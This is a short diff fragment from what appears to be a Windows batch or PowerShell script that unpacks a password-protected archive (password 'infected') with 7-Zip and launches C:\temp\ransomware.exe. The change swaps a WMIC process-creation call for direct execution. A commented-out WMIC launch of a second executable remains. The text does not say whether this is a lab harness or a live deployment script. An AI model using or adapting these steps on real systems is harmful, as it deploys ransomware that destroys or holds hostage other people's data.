@@ -17,5 +17,5 @@ powershell.exe -nologo -noprofile -command "& { Add-Type -A 'System.IO.Compressi
 .\7z x r.zip * -pinfected -y
 
 #. run ransomware
-WMIC process call create "C:\temp\ransomware.exe"
+C:\temp\ransomware.exe
 #WMIC process call create "C:\temp\notr.exe"
